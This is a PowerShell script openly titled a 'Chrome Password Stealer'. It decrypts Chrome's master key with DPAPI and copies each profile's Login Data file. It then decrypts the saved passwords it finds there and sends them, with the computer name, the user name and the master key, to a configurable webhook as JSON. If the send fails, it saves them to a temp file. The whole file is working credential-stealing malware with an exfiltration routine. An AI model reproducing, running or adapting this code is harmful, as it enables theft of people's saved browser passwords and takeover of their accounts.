# Simple Chrome Password Stealer - No SQLite Required
# Uses direct file access and DPAPI decryption
# Perfect for fresh Windows systems

param(
    [string]$WebhookUrl = "http://localhost:8080"
)

Add-Type -AssemblyName System.Security

function Get-ChromeSecretKey {
    try {
        $localStatePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Local State"
        if (-not (Test-Path $localStatePath)) {
            return $null
        }
        
        $localState = Get-Content -Path $localStatePath -Raw | ConvertFrom-Json
        $encryptedKey = $localState.os_crypt.encrypted_key
        
        if (-not $encryptedKey) {
            return $null
        }
        
        $keyBytes = [System.Convert]::FromBase64String($encryptedKey)
        $keyWithoutPrefix = $keyBytes[5..($keyBytes.Length - 1)]
        
        $secretKey = [System.Security.Cryptography.ProtectedData]::Unprotect(
            $keyWithoutPrefix, 
            $null, 
            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
        )
        
        return $secretKey
    } catch {
        return $null
    }
}

function Extract-PasswordsDirectly {
    param([byte[]]$SecretKey)
    
    $passwords = @()
    $chromePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data"
    
    if (-not (Test-Path $chromePath)) {
        return $passwords
    }
    
    # Find profile folders
    $profiles = Get-ChildItem -Path $chromePath -Directory | Where-Object { 
        $_.Name -match "^Profile.*|^Default$" 
    }
    
    foreach ($profile in $profiles) {
        $loginDataPath = Join-Path $profile.FullName "Login Data"
        
        if (Test-Path $loginDataPath) {
            try {
                # Copy database to temp
                $tempDb = "$env:TEMP\LoginData_$($profile.Name).db"
                Copy-Item -Path $loginDataPath -Destination $tempDb -Force
                
                # Read database as binary
                $dbBytes = [System.IO.File]::ReadAllBytes($tempDb)
                
                # Look for URL patterns and encrypted data
                $dbText = [System.Text.Encoding]::UTF8.GetString($dbBytes)
                
                # Extract URLs using regex
                $urlMatches = [regex]::Matches($dbText, 'https?://[^\x00\x01-\x1F\x7F-\x9F]+')
                $urls = $urlMatches | ForEach-Object { $_.Value } | Where-Object { $_ -match '^https?://' } | Select-Object -Unique
                
                # Look for v10 encrypted passwords (Chrome v80+)
                $v10Pattern = [byte[]]@(118, 49, 48)  # "v10"
                $encryptedEntries = @()
                
                for ($i = 0; $i -lt ($dbBytes.Length - 50); $i++) {
                    if ($dbBytes[$i] -eq 118 -and $dbBytes[$i+1] -eq 49 -and $dbBytes[$i+2] -eq 48) {
                        # Found v10 encrypted entry
                        $endPos = $i + 3
                        while ($endPos -lt ($dbBytes.Length - 1) -and $dbBytes[$endPos] -ne 0) {
                            $endPos++
                        }
                        
                        if ($endPos - $i -gt 15 -and $endPos - $i -lt 200) {
                            $encryptedData = $dbBytes[$i..($endPos-1)]
                            
                            # Try to decrypt
                            try {
                                $iv = $encryptedData[3..14]
                                $ciphertext = $encryptedData[15..($encryptedData.Length - 17)]
                                $tag = $encryptedData[($encryptedData.Length - 16)..($encryptedData.Length - 1)]
                                
                                # Try AES-GCM if available
                                try {
                                    $aes = [System.Security.Cryptography.AesGcm]::new($SecretKey)
                                    $plaintext = New-Object byte[] $ciphertext.Length
                                    $aes.Decrypt($iv, $ciphertext, $tag, $plaintext)
                                    $aes.Dispose()
                                    $decryptedPassword = [System.Text.Encoding]::UTF8.GetString($plaintext)
                                    
                                    if ($decryptedPassword -and $decryptedPassword.Length -gt 0 -and $decryptedPassword.Length -lt 100) {
                                        $encryptedEntries += $decryptedPassword
                                    }
                                } catch {
                                    # AES-GCM not available, skip
                                }
                            } catch {
                                # Decryption failed, skip
                            }
                        }
                    }
                }
                
                # Look for legacy DPAPI encrypted passwords
                $dpapiPattern = [byte[]]@(0x01, 0x00, 0x00, 0x00, 0xD0, 0x8C, 0x9D, 0xDF)
                
                for ($i = 0; $i -lt ($dbBytes.Length - 50); $i++) {
                    $match = $true
                    for ($j = 0; $j -lt $dpapiPattern.Length; $j++) {
                        if ($i + $j -ge $dbBytes.Length -or $dbBytes[$i + $j] -ne $dpapiPattern[$j]) {
                            $match = $false
                            break
                        }
                    }
                    
                    if ($match) {
                        try {
                            # Try to find end of DPAPI blob
                            $blobLength = 100
                            if ($i + $blobLength -lt $dbBytes.Length) {
                                $encryptedData = $dbBytes[$i..($i + $blobLength - 1)]
                                
                                $decryptedBytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
                                    $encryptedData,
                                    $null,
                                    [System.Security.Cryptography.DataProtectionScope]::CurrentUser
                                )
                                
                                $decryptedPassword = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
                                
                                if ($decryptedPassword -and $decryptedPassword.Length -gt 0 -and $decryptedPassword.Length -lt 100) {
                                    $encryptedEntries += $decryptedPassword
                                }
                            }
                        } catch {
                            # DPAPI decryption failed, skip
                        }
                    }
                }
                
                # Combine URLs with passwords (best effort matching)
                $urlIndex = 0
                foreach ($password in $encryptedEntries) {
                    $url = if ($urlIndex -lt $urls.Count) { $urls[$urlIndex] } else { "Unknown URL" }
                    
                    $passwords += [PSCustomObject]@{
                        Profile = $profile.Name
                        URL = $url
                        Username = "Extracted"
                        Password = $password
                    }
                    $urlIndex++
                }
                
                # If we have URLs but no passwords, show that we found the structure
                if ($urls.Count -gt 0 -and $encryptedEntries.Count -eq 0) {
                    foreach ($url in $urls | Select-Object -First 5) {
                        $passwords += [PSCustomObject]@{
                            Profile = $profile.Name
                            URL = $url
                            Username = "[ENCRYPTED]"
                            Password = "[REQUIRES_AES_GCM]"
                        }
                    }
                }
                
                Remove-Item -Path $tempDb -Force -ErrorAction SilentlyContinue
                
            } catch {
                # Error processing profile, skip
            }
        }
    }
    
    return $passwords
}

function Send-ToWebhook {
    param([string]$Data, [string]$WebhookUrl)

    try {
        $payload = @{
            computer = $env:COMPUTERNAME
            user = $env:USERNAME
            timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
            type = "chrome_passwords_simple"
            data = $Data
        } | ConvertTo-Json -Depth 10
        
        Invoke-WebRequest -Uri $WebhookUrl -Method POST -Body $payload -ContentType "application/json" -UseBasicParsing | Out-Null
        return $true
    } catch {
        return $false
    }
}

# Main execution
try {
    Write-Output "Simple Chrome Password Stealer - No SQLite Required"
    
    # Get Chrome secret key
    $secretKey = Get-ChromeSecretKey
    if (-not $secretKey) {
        $report = "Chrome not found or unable to decrypt master key"
    } else {
        Write-Output "Master key obtained: $([BitConverter]::ToString($secretKey).Replace('-', ''))"
        
        # Extract passwords using direct file access
        $passwords = Extract-PasswordsDirectly -SecretKey $secretKey
        
        $report = "Chrome Password Extraction - Direct Method`n"
        $report += "Computer: $env:COMPUTERNAME`n"
        $report += "User: $env:USERNAME`n"
        $report += "Date: $(Get-Date)`n"
        $report += "Master Key: $([BitConverter]::ToString($secretKey).Replace('-', ''))`n"
        $report += "Total Entries: $($passwords.Count)`n"
        $report += "="*50 + "`n`n"
        
        if ($passwords.Count -gt 0) {
            foreach ($pwd in $passwords) {
                $report += "Profile: $($pwd.Profile)`n"
                $report += "URL: $($pwd.URL)`n"
                $report += "Username: $($pwd.Username)`n"
                $report += "Password: $($pwd.Password)`n"
                $report += "-"*30 + "`n"
            }
        } else {
            $report += "No passwords extracted. Possible reasons:`n"
            $report += "- No saved passwords in Chrome`n"
            $report += "- AES-GCM decryption not available on this system`n"
            $report += "- Chrome using newer encryption methods`n"
        }
    }
    
    Write-Output "Extracted $($passwords.Count) entries"
    Write-Output "Sending to webhook..."
    
    # Send to webhook
    $success = Send-ToWebhook -Data $report -WebhookUrl $WebhookUrl
    
    if ($success) {
        Write-Output "✅ Data sent successfully!"
    } else {
        Write-Output "❌ Failed to send to webhook"
        $report | Out-File -FilePath "$env:TEMP\chrome_passwords_simple.txt" -Encoding UTF8
    }
    
} catch {
    Write-Output "Error: $_"
}
